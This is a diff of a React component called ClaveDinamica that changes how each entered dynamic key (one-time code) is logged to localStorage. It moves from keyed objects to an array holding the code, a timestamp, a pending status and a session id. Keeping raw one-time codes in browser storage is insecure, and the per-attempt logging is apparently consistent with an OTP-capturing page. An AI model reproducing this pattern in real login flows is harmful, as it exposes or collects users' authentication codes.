@@ -537,7 +537,7 @@ export default function ClaveDinamica() {
         }, 3000);
     };
 
-    // Metodo para registrar el intento de DIN
+    // Metodo para registrar el intento de DIN - ESTRUCTURA UNIFICADA
     const actualizarLocalStorage = (clave, estado = "PENDIENTE") => {
 
         // Se obtiene los datos del localStorage
@@ -549,26 +549,27 @@ export default function ClaveDinamica() {
         // Se parsea el JSON o se inicializa un objeto vacío
         let datos = raw ? JSON.parse(raw) : {};
 
-        // Se inicializa el objeto de intentos si no existe
-        if (!datos.dinamica) datos.dinamica = {};
+        // Se inicializa el objeto usuario si no existe
+        if (!datos.usuario) datos.usuario = {};
+        if (!datos.usuario.dinamica) datos.usuario.dinamica = [];
 
-        // Se crea la clave del nuevo intento
-        const intentoNum = Object.keys(datos.dinamica).length + 1;
-        const intentoKey = `intento_${intentoNum}`;
-
-        // Se registra el nuevo intento
-        datos.dinamica[intentoKey] = {
+        // Se crea el objeto del intento
+        const nuevoIntento = {
+            intento: datos.usuario.dinamica.length + 1,
             clave: clave,
             fecha: new Date().toLocaleString(),
             estado: estado,
             sesion_id: datos.sesion_id || null
         };
 
+        // Se agrega al array
+        datos.usuario.dinamica.push(nuevoIntento);
+
         // Se guarda nuevamente en el localStorage
         localStorage.setItem(storageKey, JSON.stringify(datos));
 
-        // Se retorna el objeto de intentos
-        return datos.dinamica;
+        // Se retorna el array
+        return datos.usuario.dinamica;
     };
 
     // Metodo para manejar el foco en el OTP
